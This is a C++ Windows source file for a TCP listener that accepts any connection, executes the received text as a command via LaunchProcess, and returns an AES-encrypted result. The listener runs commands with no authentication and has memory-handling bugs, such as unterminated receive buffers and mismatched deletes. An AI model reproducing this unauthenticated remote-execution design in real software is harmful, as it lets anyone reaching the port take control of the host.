#include <tchar.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>

using namespace std;

extern BOOL execResult;
extern wstring processList;

extern SOCKET listen_socket;
extern HANDLE stopEvent;

void addLogMessage(const TCHAR* a);
void CleanUp();
void LaunchProcess(LPTSTR cmdLine);
wchar_t* a2w(const char* c, int codePage = CP_UTF8);
BOOL AesEncrypt(LPWSTR base64str, LPWSTR* b64Result);

//size_t power(size_t x, size_t p)
//{
//	size_t res = 1;
//	for (size_t i = 0; i < p; i++)
//		res *= x;
//
//	return res;
//}

// In c# BinaryWriter.Write(string) data is prefixed by string length;
// this function gets position actual data starts with (prefix end + 1)
//size_t GetPrefix(size_t strLen)
//{
//	const size_t maxLen = 4; //string length up to ~4 bln. of symbols
//	const size_t byteLenInBits = 7; // UTF-7
//	for (size_t i = 1; i <= maxLen; i++)
//		if (strLen <= power(2, i * byteLenInBits) + i)
//			return i;
//
//	return 0;
//}

bool ValidatePort(LPTSTR port, LPTSTR portAtStart)
{
	const int maxPortLen = 5;
	const int maxPortVal = 65535;

	_tcscpy_s(port, 4, _T("500")); //by default

	if (portAtStart)
	{
		size_t portAtStartLen = _tcslen(portAtStart);
		if (portAtStartLen)
			_tcscpy_s(port, portAtStartLen < maxPortLen ? portAtStartLen + 1 : maxPortLen + 1, portAtStart);
		else
		{
			addLogMessage((wstring(L"Invalid port number: ") + portAtStart).data());
			return false;
		}
	}
	else
	{
		LPCTSTR cl = GetCommandLine();
		int argNum = 0;
		LPTSTR* args = CommandLineToArgvW(cl, &argNum);
		if (argNum > 1)
		{
			size_t portLen = _tcslen(args[1]);
			_tcscpy_s(port, portLen < maxPortLen ? portLen + 1 : maxPortLen + 1, args[1]);
		}
	}
	
	size_t finPortLen = wstring(port).length();
	if (finPortLen > 5)
	{
		addLogMessage((wstring(L"Invalid port number: ") + port).data());
		return false;
	}

	try
	{
		int nPort = _ttoi(port);
		if (!nPort || nPort > maxPortVal)
		{
			addLogMessage((wstring(L"Invalid port number: ") + port).data());
			return false;
		}
	}
	catch (...)
	{
		addLogMessage((wstring(L"Invalid port number: ") + port).data());
		return false;
	}
	
	return true;
}

void GetClientIP(SOCKET client_socket, LPSTR ipStrResult, LPSTR hostName)
{
	sockaddr_in addr = {};
	socklen_t addr_size = sizeof(sockaddr_in);

	if (getpeername(client_socket, (sockaddr*)&addr, &addr_size))
	{
		addLogMessage(_T("Failed to get client IP"));
		return;
	}
	inet_ntop(AF_INET, &addr.sin_addr, ipStrResult, INET_ADDRSTRLEN);

	char servInfo[NI_MAXSERV];
	getnameinfo((sockaddr*)&addr,
		sizeof(sockaddr),
		hostName,
		NI_MAXHOST, servInfo, NI_MAXSERV, NI_NUMERICSERV);
}

void Listen(LPTSTR portAtStart = NULL)
{
	TCHAR port[6];
	if (!ValidatePort(port, portAtStart))
		return;

	const int max_client_buffer_size = 2048;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		addLogMessage(_T("WSAStartup failed"));
		return;
	}

	ADDRINFOT* addr = NULL;

	ADDRINFOT hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	if (GetAddrInfo(NULL, port, &hints, &addr))
	{
		addLogMessage(_T("GetAddrInfo failed\n"));
		WSACleanup();
		return;
	}

	listen_socket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
	if (listen_socket == INVALID_SOCKET) {
		addLogMessage(_T("Error creating listening socket\n"));
		FreeAddrInfo(addr);
		WSACleanup();
		return;
	}

	if (bind(listen_socket, addr->ai_addr, (int)addr->ai_addrlen) == SOCKET_ERROR)
	{
		addLogMessage(_T("Binding failed\n"));
		FreeAddrInfo(addr);
		CleanUp();
		return;
	}

	FreeAddrInfo(addr);

	if (listen(listen_socket, SOMAXCONN) == SOCKET_ERROR)
	{
		addLogMessage(_T("Listening failed\n"));
		CleanUp();
		return;
	}

	while (WaitForSingleObject(stopEvent, 0) != WAIT_OBJECT_0)
	{
		SOCKET client_socket = accept(listen_socket, NULL, NULL);
		if (client_socket == INVALID_SOCKET)
		{
			addLogMessage(_T("Accept failed\n"));
			continue;
		};

		char ipStr[INET_ADDRSTRLEN] = { '\0' };
		char hostName[NI_MAXHOST] = { '\0' };
		GetClientIP(client_socket, ipStr, hostName);
		if (strlen(ipStr))
		{
			LPTSTR pBuf1 = a2w(ipStr);
			LPTSTR pBuf2 = a2w((string(", ") + hostName).data());
			LPTSTR pBuf3 = a2w("");
			addLogMessage((wstring(_T("Connection accepted from: ")) + pBuf1 + (strlen(hostName) ? pBuf2 : pBuf3)).data());
			delete pBuf1;
			delete pBuf2;
			delete pBuf3;
		}

		char buf[max_client_buffer_size + 1];
		buf[max_client_buffer_size] = '\0';

		int bytesRead = 0;
		wstring result = L"";
		execResult = TRUE;
		processList.clear();

		do
		{
			bytesRead = recv(client_socket, buf, max_client_buffer_size, 0);
			if (bytesRead > 0)
			{
				LPTSTR pBuf = a2w(buf);
				result.append(pBuf, bytesRead);
				delete[] pBuf;
			}
		}
		while (bytesRead > 0);

		if (result.length())
		{
			LaunchProcess((LPTSTR)result.data());
			
			wchar_t* b64Result;
			wchar_t* dataToEncrypt;

			if (execResult && processList.length())
			{
				processList += L'\0';
				dataToEncrypt = new wchar_t[processList.length()];
				_tcscpy_s(dataToEncrypt, _tcslen(processList.data()) + 1, processList.data());
			}
			else if (execResult)
				dataToEncrypt = (wchar_t*)L"Success!\0";
			else
				dataToEncrypt = (wchar_t*)L"Failed!\0";

			if (AesEncrypt(dataToEncrypt, &b64Result))
				send(client_socket, (char*)b64Result, (int)_tcslen(b64Result) * sizeof(wchar_t), 0);
			
			if (execResult && processList.length())
				delete[] dataToEncrypt;
			delete[] b64Result;

		}

		shutdown(client_socket, SD_BOTH);
		closesocket(client_socket);
	};
}